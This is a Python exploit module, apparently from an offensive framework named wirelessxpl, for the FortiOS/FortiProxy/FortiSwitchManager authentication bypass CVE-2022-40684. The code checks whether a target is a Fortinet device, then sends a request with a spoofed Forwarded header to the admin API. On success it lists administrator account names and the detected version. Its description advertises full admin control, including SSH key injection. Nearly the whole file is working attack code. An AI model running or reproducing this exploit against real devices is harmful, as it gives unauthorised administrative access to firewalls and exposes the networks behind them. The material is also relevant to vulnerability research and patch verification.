# Author: André Henrique (LinkedIn/X: @mrhenrike)
import json
import ssl
import urllib.request
import urllib.error

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """FortiOS / FortiProxy / FortiSwitchManager Authentication Bypass (CVE-2022-40684).

    An authentication bypass in the administrative interface of FortiOS,
    FortiProxy and FortiSwitchManager allows an unauthenticated attacker to
    perform operations on the admin API via specially crafted HTTP/HTTPS
    requests containing a Forwarded header that tricks the device into
    treating the request as coming from a trusted internal source.

    Affected versions:
      FortiOS: 7.0.0 to 7.0.6, 7.2.0 to 7.2.1
      FortiProxy: 7.0.0 to 7.0.6, 7.2.0
      FortiSwitchManager: 7.0.0, 7.2.0

    CVSS v3.1: 9.8 (Critical), AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "FortiOS Authentication Bypass via Forwarded Header (CVE-2022-40684)",
        "description": (
            "Exploits CVE-2022-40684 to bypass authentication on FortiGate / "
            "FortiProxy / FortiSwitchManager administrative interfaces. A "
            "crafted HTTP request with a specific Forwarded header allows "
            "unauthenticated access to the REST API, enabling full admin "
            "control including SSH key injection and configuration changes."
        ),
        "authors": (
            "Fortinet PSIRT (advisory)",
            "Horizon3.ai (public PoC analysis)",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2022-40684",
            "https://www.fortiguard.com/psirt/FG-IR-22-377",
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-40684",
        ),
        "devices": (
            "FortiGate (FortiOS 7.0.0-7.0.6, 7.2.0-7.2.1)",
            "FortiProxy 7.0.0-7.0.6, 7.2.0",
            "FortiSwitchManager 7.0.0, 7.2.0",
        ),
    }

    target = OptIP("", "Target IPv4 address of the FortiGate/FortiProxy device")
    port = OptPort(443, "HTTPS management port (default 443)")
    timeout = OptFloat(5.0, "HTTP request timeout in seconds")

    _LOGIN_PATH = "/login"
    _API_ADMIN_PATH = "/api/v2/cmdb/system/admin"
    _FORWARDED_BYPASS = "for=\"[127.0.0.1]:8000\";by=\"[127.0.0.1]:9000\";"

    def _make_url(self, path: str) -> str:
        return f"https://{self.target}:{self.port}{path}"

    def _http_request(
        self, url: str, method: str = "GET", data: bytes | None = None,
        headers: dict | None = None,
    ) -> tuple[int, str, dict]:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        if headers is None:
            headers = {}
        headers.setdefault("User-Agent", "Report Runner")

        req = urllib.request.Request(url, data=data, headers=headers, method=method)
        try:
            resp = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)
            body = resp.read().decode("utf-8", errors="replace")
            return resp.status, body, dict(resp.headers)
        except urllib.error.HTTPError as exc:
            body = exc.read().decode("utf-8", errors="replace") if exc.fp else ""
            return exc.code, body, dict(exc.headers) if exc.headers else {}
        except Exception as exc:
            raise ConnectionError(f"HTTP request failed: {exc}") from exc

    def run(self) -> None:
        if not self.check():
            print_error(
                f"Target {self.target}:{self.port} does not appear to be a FortiGate/FortiProxy"
            )
            return

        print_success("FortiOS management interface detected, attempting auth bypass")
        self._exploit()

    @mute
    def check(self) -> bool:
        """Detect FortiGate/FortiProxy login page and extract version hints."""
        try:
            status, body, headers = self._http_request(self._make_url(self._LOGIN_PATH))
            server = headers.get("Server", "").lower()
            if "fortios" in body.lower() or "fortigate" in body.lower():
                return True
            if "fortiproxy" in body.lower():
                return True
            if any(marker in server for marker in ("fortigat", "fortios")):
                return True
        except ConnectionError:
            pass
        return False

    def _extract_version(self, body: str) -> str:
        """Try to parse FortiOS version from the login page or API response."""
        import re
        match = re.search(r"FortiOS\s*v?(\d+\.\d+\.\d+)", body, re.IGNORECASE)
        if match:
            return match.group(1)
        match = re.search(r'"version"\s*:\s*"v?([^"]+)"', body)
        if match:
            return match.group(1)
        return "unknown"

    def _exploit(self) -> None:
        print_status("Attempting authentication bypass via Forwarded header...")

        headers = {
            "Forwarded": self._FORWARDED_BYPASS,
            "Content-Type": "application/json",
        }

        try:
            status, body, resp_headers = self._http_request(
                self._make_url(self._API_ADMIN_PATH),
                method="GET",
                headers=headers,
            )

            if status == 200:
                print_success(
                    "AUTH BYPASS CONFIRMED: unauthenticated access to admin API "
                    "via Forwarded header. Target is VULNERABLE to CVE-2022-40684."
                )
                try:
                    data = json.loads(body)
                    results = data.get("results", [])
                    if results:
                        admin_names = [
                            a.get("name", "?") for a in results if isinstance(a, dict)
                        ]
                        print_info(f"Admin accounts found: {', '.join(admin_names)}")
                except (json.JSONDecodeError, KeyError):
                    print_info(f"Raw response excerpt: {body[:300]}")

                version = self._extract_version(body)
                print_info(f"Detected FortiOS version: {version}")

            elif status == 401:
                print_info(
                    "API returned 401. The Forwarded header bypass may be patched."
                )
            elif status == 403:
                print_info(
                    "API returned 403. Trusted host restrictions may be active."
                )
            else:
                print_info(
                    f"API returned HTTP {status}. Manual verification recommended."
                )
        except ConnectionError as exc:
            print_error(f"Connection failed during exploitation: {exc}")
